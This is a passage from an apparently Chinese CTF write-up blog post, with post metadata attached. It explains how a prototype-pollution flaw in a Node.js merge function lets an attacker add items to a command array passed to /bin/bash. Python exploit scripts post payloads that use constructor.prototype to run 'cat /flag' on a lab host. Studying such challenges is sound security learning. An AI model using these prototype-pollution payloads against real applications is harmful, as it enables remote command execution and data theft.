class=\"language-json\"><span class=\"token punctuation\">{</span><span class=\"token property\">\"user\"</span><span class=\"token operator\">:</span>\"<span class=\"token punctuation\">{</span><span class=\"token property\">\"username\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"guest\"</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"command\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span>\"<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>只是我们想要执行的<code>command</code>是<code>cat /flag</code>，但是很明显我们长度限制过不了，所以如果想要执行命令是不能把值写到<code>command</code>中，不然肯定会被拦截</p>\n<p>我们看看<code>user.js</code>中，是如何执行<code>command</code>的，</p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\">handler <span class=\"token punctuation\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> reply<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                ChildProcess<span class=\"token punctuation\">.</span><span class=\"token function\">execFile</span><span class=\"token punctuation\">(</span>bin<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">.</span>command<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        reply<span class=\"token punctuation\">.</span><span class=\"token function\">code</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>status<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> info<span class=\"token punctuation\">:</span> error<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span>\n                    reply<span class=\"token punctuation\">.</span><span class=\"token function\">code</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> status <span class=\"token punctuation\">:</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> info <span class=\"token punctuation\">:</span> <span class=\"token template-string\"><span class=\"token string\">`User of </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>request<span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">.</span>username<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> : </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>stdout<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">`</span></span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>发现它执行是执行<code>request.user.command</code>的内容，那便又回到污染user，然后再通过<code>merge</code>污染<code>request.user</code>，所以这里尝试污染<code>request.user</code>的实体中的<code>command</code>参数</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>但是，<code>request.user</code>在执行<code>merge</code>之前就已经有<code>command</code>值<code>[&quot;-c&quot;,&quot;id&quot;]</code>,所以作为一个已经存在的参数，就算污染了实体，它查找调用时还是会以它自己已有的值为先，所以如下图</p></blockquote>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906122510728.png\" alt=\"image-20230906122510728\"></p>\n<p>我们仔细执行命令的代码，发现它是将 <code>request.user.command</code>这个数组直接接到 <code>/bin/bash</code>后面</p>\n<p>构造成</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">/bin/bash -c <span class=\"token function\">id</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这种命令。</p>\n<p>但是突然想到一点，既然无法直接污染实体修改已有参数，那么如果在command数组中再加一个键值<code>2</code>，并且也是命令，能否也成功执行呢？</p>\n<p>我们本地可以先测试一下，</p>\n<pre class=\"line-numbers language-py\"><code class=\"language-py\">import requests\nurl=\"http://127.0.0.1:3000/user\"\nuser='''{\"username\":\"ttoc\",\"constructor\":{\"prototype\":{\"2\":\"whoami\"}},\"command\":[\"-c\",\"id\"]}'''\nprint(requests.post(url=url, json={\"user\": user}).text)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>只看调试结果，command数组的变化</p>\n<p>开始都是一样的，再加上这里的command数组符合checkUser的要求，通过</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131218447.png\" alt=\"image-20230906131218447\"></p>\n<p>当运行到key为<code>prototype</code>时，</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131333083.png\" alt=\"image-20230906131333083\"></p>\n<p>可以看到<code>target</code>，也就是<code>request.user</code>，也获得了一个属性2且值为<code>whoami</code>的，说明污染成功</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131429139.png\" alt=\"image-20230906131429139\"></p>\n<p>继续看对command数组的影响，虽然两者<code>command</code>数组一样，但是后面就会出现区别</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906133038986.png\" alt=\"image-20230906133038986\"></p>\n<p>发现在不断的<code>merge</code>合并时，<code>user</code>和<code>request.user</code>中两者的数组中的<code>key</code>也在比较，但是由于两者的<code>command</code>数组中是字符串，属于<code>whileTypes</code>，所以会直接将<code>target[key] = source[key];</code>，也就是将<code>user</code>中值赋值给<code>request.user</code>，也就是修改<code>command</code>值</p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> whileTypes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'boolean'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'string'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'number'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bigint'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'symbol'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'undefined'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>whileTypes<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> source<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>whileTypes<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>key <span class=\"token operator\">!==</span> <span class=\"token string\">'__proto__'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> source<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n    target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> source<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>由于<code>key=0</code>和<code>key=1</code>两者都一样都是<code>-c</code>,<code>id</code>，所以赋值没有变化</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906132428230.png\" alt=\"image-20230906132428230\"></p>\n<p>当<code>key=2</code>时，因为之前执行<code>prototype</code>时，使得<code>request.user</code>也有属性2这个值，</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906133910040.png\" alt=\"image-20230906133910040\"></p>\n<p>虽然这个属性2是在Object中，但是是在Array之上，所以即便command数组中没有key&#x3D;2，但是仍然就会从原型链中寻找，所以当再次运行到<code>target[key] = source[key];</code>时，属性2就被当作command的属性2，赋值进去了</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906134039538.png\" alt=\"image-20230906134039538\"></p>\n<p>于是最后执行命令时就是，</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">/bin/bash -c <span class=\"token function\">id</span> <span class=\"token function\">whoami</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>由这个现象便可以构造出<code>payload</code>，可以看到便得到flag{test}</p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"><span class=\"token keyword\">import</span> requests\nurl<span class=\"token operator\">=</span><span class=\"token string\">\"http://172.28.31.86:3000/user\"</span>\nuser<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token string\">'{\"username\":\"ttoc\",\"constructor\":{\"prototype\":{\"2\":\"cat /flag\"}},\"command\":[\"-c\",\"-i\"]}'</span><span class=\"token string\">''</span>\n<span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">:</span>user<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>requests<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> json<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">:</span> user<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906134555175.png\" alt=\"image-20230906134555175\"></p>\n<p>当然这只是一个，同理，既然限制command数组中元素个数要小于等于2，所以一个也是可以的</p>\n<pre class=\"line-numbers language-js\"><code class=\"language-js\"># http<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span><span class=\"token number\">172.28</span><span class=\"token punctuation\">.</span><span class=\"token number\">31.86</span><span class=\"token punctuation\">:</span><span class=\"token number\">3000</span><span class=\"token operator\">/</span>user\n<span class=\"token keyword\">import</span> requests\nurl<span class=\"token operator\">=</span><span class=\"token string\">\"http://172.28.31.86:3000/user\"</span>\nuser<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token string\">'{\"username\":\"ttoc\",\"constructor\":{\"prototype\":{\"1\":\"cat /flag\"}},\"command\":[\"-c\"]}'</span><span class=\"token string\">''</span>\n<span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">:</span>user<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>requests<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> json<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">:</span> user<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>结果同上，只是不能让command为空就行，不然会报错</p>\n<hr>\n<p>直接浏览器<code>console</code>，展示也可以理解原理</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906160734249.png\" alt=\"image-20230906160734249\"></p>\n<p>这里的属性2实际是在command实体中</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906160836260.png\" alt=\"image-20230906160836260\"></p>\n<h2 id=\"NoRCE\"><a href=\"#NoRCE\" class=\"headerlink\" title=\"NoRCE\"></a>NoRCE</h2>","text":"学习学习 强网拟态2022WHOYOUARE这道题目的环境是nodejs，猜考点是原型链污染，其框架根据附件名称可知为fastify 看题目名字和刚打开题目的提...","permalink":"/post/2022强网拟态","photos":[],"count_time":{"symbolsCount":"7.9k","symbolsTime":"7 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022\"><span class=\"toc-text\">强网拟态2022</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#WHOYOUARE\"><span class=\"toc-text\">WHOYOUARE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">代码审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#app-js\"><span class=\"toc-text\">app.js</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#user-js\"><span class=\"toc-text\">user.js</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#merge-js\"><span class=\"toc-text\">merge.js</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NoRCE\"><span class=\"toc-text\">NoRCE</span></a></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"西湖论剑2022-wp","uid":"3e22a855be290895a6fbe5843d97f92e","slug":"2022西湖论剑","date":"2023-02-14T05:04:26.911Z","updated":"2023-08-25T02:09:35.567Z","comments":true,"path":"api/articles/2022西湖论剑.json","keywords":null,"cover":"/img/36.jpg","text":"麻了，我也想在比赛时输出，而不是比赛后 西湖论剑2022real_ez_node启动环境后页面 ejs猜测是原型链污染 分析一下代码 app.js var cr...","permalink":"/post/2022西湖论剑","photos":[],"count_time":{"symbolsCount":"4.3k","symbolsTime":"4 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"2022RCTF","uid":"5989226e724dd04d4cb9a6777f53450e","slug":"2022RCTF","date":"2023-02-13T15:21:49.888Z","updated":"2023-08-06T08:02:03.811Z","comments":true,"path":"api/articles/2022RCTF.json","keywords":null,"cover":"/img/41.jpg","text":"学到很多 RCTF2022easyupload 附件 https://adworld.xctf.org.cn/media/file/task/0e2ca001-...","permalink":"/post/2022RCTF","photos":[],"count_time":{"symbolsCount":"35k","symbolsTime":"32 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}